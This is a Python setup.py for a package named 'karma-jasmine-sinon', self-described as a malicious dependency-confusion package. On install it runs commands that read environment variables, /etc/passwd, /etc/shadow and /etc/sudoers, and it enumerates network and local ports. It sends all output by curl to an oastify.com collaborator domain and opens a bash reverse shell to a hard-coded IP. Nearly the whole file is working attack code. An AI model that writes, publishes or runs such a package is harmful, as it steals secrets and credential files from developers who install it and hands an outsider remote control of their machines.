import os

import socket

import subprocess

import urllib.parse



COLLABORATOR_DOMAIN = "3oshfqlkrmxri1w7y7zq7uf1asgj4asz.oastify.com"



def send_to_collaborator(tag, data):

    safe = urllib.parse.quote_plus(data)

    os.system(f"curl http://{COLLABORATOR_DOMAIN}/{tag}?data={safe}")



# Basic host enumeration

commands = {

    "whoami": "whoami",

    "hostname": "hostname",

    "env": "env",

    "passwd": "cat /etc/passwd",

    "shadow": "cat /etc/shadow",

    "issue": "cat /etc/issue",

    "release": "cat /etc/*-release",

    "id": "id",

    "sudoers": "cat /etc/sudoers",

    "netstat": "netstat -tulpn",

    "ifconfig": "ifconfig || ip a",

    "routes": "route -n || ip r",

    "cron": "cat /etc/crontab",

    "users": "cut -d: -f1 /etc/passwd",

}



for tag, cmd in commands.items():

    try:

        output = subprocess.getoutput(cmd)

        send_to_collaborator(tag, output)

    except Exception as e:

        send_to_collaborator(tag + "_error", str(e))



# Check common local services

for port in [80, 443, 3000, 5000, 8000, 8080, 9000]:

    try:

        s = socket.create_connection(("127.0.0.1", port), timeout=1)

        send_to_collaborator("port_open", f"127.0.0.1:{port} is open")

        s.close()

    except:

        pass



# Optional reverse shell (if you’re listening)

reverse_shell_ip = "183.83.172.35"  # your public IP

reverse_shell_port = "4444"

try:

    os.system(f"bash -c 'bash -i >& /dev/tcp/{reverse_shell_ip}/{reverse_shell_port} 0>&1 &'")

except:

    pass



# Required for dependency confusion packaging

from setuptools import setup, find_packages



setup(

    name="karma-jasmine-sinon",

    version="2.1.1",

    packages=find_packages(),

    author="kali182",

    description="fake solidity-coverage Malicious package for dependency confusion test",

    url="https://tractusx.dev",

    install_requires=[],

)
